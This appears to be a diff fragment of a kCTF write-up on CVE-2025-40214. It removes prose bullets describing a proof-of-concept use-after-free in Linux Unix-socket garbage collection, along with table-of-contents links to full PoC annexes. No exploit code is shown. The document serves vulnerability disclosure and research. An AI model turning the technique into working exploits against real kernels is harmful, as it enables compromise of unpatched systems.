-<li><strong>No stream listener / accept / embryo.</strong> The graph shape reduces to a two-socket cycle plus a two-edge chain, which is enough to both flip <code>unix_graph_grouped</code> and seed the stale <code>scc_index = 2</code> label.</li>
-<li><strong>Two cycle-edges replace the <code>sk-X → sk-X</code> self-loop.</strong> A self-loop is a cycle, but a two-socket cycle <code>B ↔ A</code> serves double duty — it keeps <code>unix_graph_maybe_cyclic</code> true <em>and</em> is the very cycle whose vertices get freed with <code>scc_index=2</code> right before stage 3 allocates fresh ones.</li>
-<li><strong><code>recv_fd(skC)</code> is the oracle.</strong> Instead of planting pipes and checking for <code>EPIPE</code>, this PoC pulls the freed <code>sk-A</code> back out via <code>recvmsg</code> and <code>write()</code>s into it — a direct access to the dangling socket (with a non-fdtable refholder in play, this <code>write()</code> is where a KASAN splat would land).</li>
-</ul>
-
+</span></span></code></pre></div>
         
     </div>
 
@@ -1230,19 +754,7 @@ sk gets destroyed
     <li><a href="#cve-2025-40214--kctf-entry">CVE-2025-40214 — kCTF entry</a>
       <ul>
         <li><a href="#the-patch">The patch</a></li>
-        <li><a href="#root-cause-in-one-sentence">Root cause in one sentence</a></li>
-        <li><a href="#canonical-three-stage-exploit">Canonical three-stage exploit</a></li>
-        <li><a href="#my-own-strategy--b--a--c--d-no-listener-no-embryo">My own strategy — <code>B ↔ A → C → D</code> (no listener, no embryo)</a></li>
-      </ul>
-    </li>
-    <li><a href="#annex-1--full-poc-embryo--listener-variant">Annex 1 — full PoC (embryo / listener variant)</a>
-      <ul>
-        <li><a href="#expected-output-on-a-vulnerable-kernel">Expected output on a vulnerable kernel</a></li>
-      </ul>
-    </li>
-    <li><a href="#annex-2--alternate-poc-b--a--c--d">Annex 2 — alternate PoC (<code>B ↔ A → C → D</code>)</a>
-      <ul>
-        <li><a href="#differences-from-annex-1">Differences from Annex 1</a></li>
+        <li><a href="#root-cause">Root cause:</a></li>
       </ul>
     </li>
   </ul>
